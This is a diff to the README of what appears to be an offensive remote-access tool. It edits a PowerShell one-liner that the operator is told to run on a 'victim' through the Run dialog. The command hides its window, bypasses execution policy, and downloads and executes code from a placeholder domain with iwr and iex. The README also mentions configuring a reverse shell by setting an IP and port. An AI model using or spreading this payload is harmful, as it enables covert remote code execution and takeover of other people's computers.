@@ -76,7 +76,7 @@ If deamonized, logging can be found @ ```/var/log/aldebaran.log```
 Run the following command on victim in 'run' (win+r)
 
 ```
-C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "$command = iwr -Uri https://www.your_domain.com/ -Method GET  -UseBasicParsing; iex $command"
+C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "`$command = iwr -Uri https://www.your_domain.com/ -Method GET  -UseBasicParsing; iex `$command"
 ```
 ## Reverese shell
 Change the ip and port in darma/resources/rev.txt to make the reverse shell option work
